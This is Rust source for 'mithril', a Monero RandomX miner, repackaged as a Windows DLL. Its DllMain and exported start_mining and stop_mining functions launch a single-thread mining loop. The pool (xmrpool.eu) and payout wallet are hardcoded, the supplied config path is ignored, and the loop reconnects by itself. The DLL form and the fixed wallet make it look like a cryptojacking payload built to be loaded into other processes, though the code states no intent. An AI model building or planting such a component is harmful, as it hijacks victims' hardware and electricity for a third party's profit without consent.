#![crate_name = "mithril"]
#![crate_type = "lib"]
extern crate argon2;
extern crate hex;

#[macro_use]
extern crate log;

extern crate crossbeam_channel;
#[macro_use]
extern crate serde_derive;
extern crate strum;

use self::crossbeam_channel::{select, unbounded, Receiver};
use std::io;
use std::sync::Once;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::time::Duration;
use std::time::Instant;
use std::time::SystemTime;

use randomx::memory::VmMemoryAllocator;
use stratum::{StratumAction, StratumClient};
use worker::worker_pool;
use worker::worker_pool::WorkerPool;

pub mod byte_string;
pub mod metric;
pub mod mithril_config;
pub mod randomx;
pub mod stratum;
pub mod timer;
pub mod worker;

static INIT: Once = Once::new();
static mut MINER_RUNNING: Option<Arc<AtomicBool>> = None;
static mut MINER_THREAD: Option<thread::JoinHandle<()>> = None;

#[derive(Debug, PartialEq)]
enum MainLoopExit {
    Stop,
}

fn await_timeout() {
    thread::sleep(Duration::from_secs(60))
}

/// This function terminates if a non-recoverable error was detected (i.e. connection lost)
fn start_main_event_loop(
    pool: &mut WorkerPool,
    client_err_rcvr: &Receiver<std::io::Error>,
    stratum_rcvr: &Receiver<StratumAction>,
    metric: &metric::Metric,
    running: &Arc<AtomicBool>,
) -> io::Result<MainLoopExit> {
    let mut last_time = Instant::now();
    let mut last_hash_count = 0;
    let mut last_hashrate_display = SystemTime::now();
    let hashrate_display_interval = Duration::from_millis(1000);

    loop {
        if !running.load(Ordering::Relaxed) {
            return Ok(MainLoopExit::Stop);
        }

        // Check if it's time to display hashrate
        let now = SystemTime::now();
        if now
            .duration_since(last_hashrate_display)
            .unwrap_or(Duration::from_secs(0))
            >= hashrate_display_interval
        {
            let current_time = Instant::now();
            let current_hash_count = metric.hash_count();
            let hash_diff = current_hash_count - last_hash_count;
            let elapsed_secs = current_time.duration_since(last_time).as_secs_f64();

            if elapsed_secs > 0.0 {
                // Convert to kilo-hashes per second
                let khs = (hash_diff as f64 / elapsed_secs) / 1000.0;
                println!(
                    "Hashrate: {:.2} kH/s ({} hashes in {:.1}s)",
                    khs, hash_diff, elapsed_secs
                );
            }

            last_time = current_time;
            last_hash_count = current_hash_count;
            last_hashrate_display = now;
        }

        // Check if there's any message (with very short timeout)
        select! {
            recv(stratum_rcvr) -> stratum_msg => {
                if stratum_msg.is_err() {
                    return Err(io::Error::new(io::ErrorKind::ConnectionAborted, "received error"));
                }

                match stratum_msg.unwrap() {
                    StratumAction::Job{miner_id, seed_hash, blob, job_id, target} => {
                        pool.job_change(&miner_id, &seed_hash, &blob, &job_id, &target);
                    },
                    StratumAction::Error{err} => {
                        println!("Received stratum error: {}", err);
                    },
                    StratumAction::Ok => {
                        println!("Received stratum ok");
                    },
                    StratumAction::KeepAliveOk => {
                        println!("Received keep alive ok");
                    }
                }
            },
            recv(client_err_rcvr) -> client_err_msg => {
                return Err(io::Error::new(io::ErrorKind::Other, format!("error received {:?}", client_err_msg)));
            },
            default(Duration::from_millis(100)) => {
                // Timeout after 100ms to allow for hashrate display
            }
        }
    }
}

fn miner_thread_func(_config_path: &str, running: Arc<AtomicBool>) {
    // Use hardcoded configuration
    let pool_conf = stratum::stratum_data::PoolConfig {
        pool_address: "xmrpool.eu:3333".to_string(),
        wallet_address: "48y3RCT5SzSS4jumHm9rRL91eWWzd6xcVGSCF1KUZGWYJ6npqwFxHee4xkLLNUqY4NjiswdJhxFALeRqzncHoToeJMg2bhL".to_string(),
        pool_password: "x".to_string(),
    };

    // Hardcoded worker config with 1 thread
    let worker_conf = worker::worker_pool::WorkerConfig {
        num_threads: 1,
        auto_tune: false,
        auto_tune_interval_minutes: 0,
        auto_tune_log: "".to_string(),
    };

    // Minimal metric config
    let metric_conf = metric::MetricConfig {
        enabled: true,
        resolution: 100,
        sample_interval_seconds: 60,
        report_file: "/dev/null".to_string(),
    };

    let mut vm_memory_allocator = VmMemoryAllocator::initial();

    while running.load(Ordering::Relaxed) {
        // Stratum start
        let (stratum_sndr, stratum_rcvr) = unbounded();
        let (client_err_sndr, client_err_rcvr) = unbounded();

        println!("Logging into stratum server: {}", pool_conf.pool_address);
        let login_result = StratumClient::login(pool_conf.clone(), client_err_sndr, stratum_sndr);
        if login_result.is_err() {
            println!("Stratum login failed {:?}", login_result.err());
            await_timeout();
            continue;
        }

        println!("Completed stratum login!");

        let client = login_result.expect("stratum client");
        let share_sndr = client.new_cmd_channel();

        let (metric_sndr, metric_rcvr) = unbounded();
        let metric = metric::start(metric_conf.clone(), metric_rcvr);

        // Start worker pool with single thread
        let mut pool = worker_pool::start(
            worker_conf.num_threads,
            &share_sndr,
            metric_conf.resolution,
            &metric_sndr.clone(),
            vm_memory_allocator,
        );

        let term_result = start_main_event_loop(
            &mut pool,
            &client_err_rcvr,
            &stratum_rcvr,
            &metric,
            &running,
        );

        vm_memory_allocator = pool.vm_memory_allocator.clone();
        pool.stop();
        client.stop();

        match term_result {
            Err(err) => {
                println!(
                    "Error received, restarting connection after 60 seconds. Error: {}",
                    err
                );
                await_timeout();
            }
            Ok(_) => {
                println!("Main loop exit");
                pool.join();
                metric.stop();
                metric.join();
            }
        }

        if !running.load(Ordering::Relaxed) {
            break;
        }
    }
}

/// DLL entry point - called when the DLL is loaded
#[no_mangle]
pub extern "C" fn DllMain(_hinst: usize, reason: u32, _reserved: *mut usize) -> i32 {
    match reason {
        1 => {
            // DLL_PROCESS_ATTACH
            // Initialize if needed
            INIT.call_once(|| unsafe {
                MINER_RUNNING = Some(Arc::new(AtomicBool::new(false)));
            });
        }
        0 => {
            // DLL_PROCESS_DETACH
            // Clean up
            unsafe {
                stop_mining();
            }
        }
        _ => {}
    }
    1 // Return TRUE
}

/// Initialize and start the miner
#[no_mangle]
pub extern "C" fn start_mining(config_path: *const i8) -> i32 {
    unsafe {
        if MINER_RUNNING.is_none() {
            INIT.call_once(|| {
                MINER_RUNNING = Some(Arc::new(AtomicBool::new(false)));
            });
        }

        let running = MINER_RUNNING.as_ref().unwrap();

        // If already running, return
        if running.load(Ordering::Relaxed) {
            return 0;
        }

        // Set to running
        running.store(true, Ordering::Relaxed);

        // Convert C string to Rust string
        let config_path_str = if config_path.is_null() {
            String::new()
        } else {
            let c_str = std::ffi::CStr::from_ptr(config_path);
            c_str.to_string_lossy().into_owned()
        };

        // Start miner thread
        let running_clone = running.clone();
        let thread = thread::spawn(move || {
            miner_thread_func(&config_path_str, running_clone);
        });

        MINER_THREAD = Some(thread);

        1 // Success
    }
}

/// Stop the miner
#[no_mangle]
pub extern "C" fn stop_mining() -> i32 {
    unsafe {
        if let Some(running) = MINER_RUNNING.as_ref() {
            // Set to stopped
            running.store(false, Ordering::Relaxed);

            // Wait for thread to exit
            if let Some(thread) = MINER_THREAD.take() {
                let _ = thread.join();
            }

            return 1; // Success
        }
    }
    0 // Not running
}
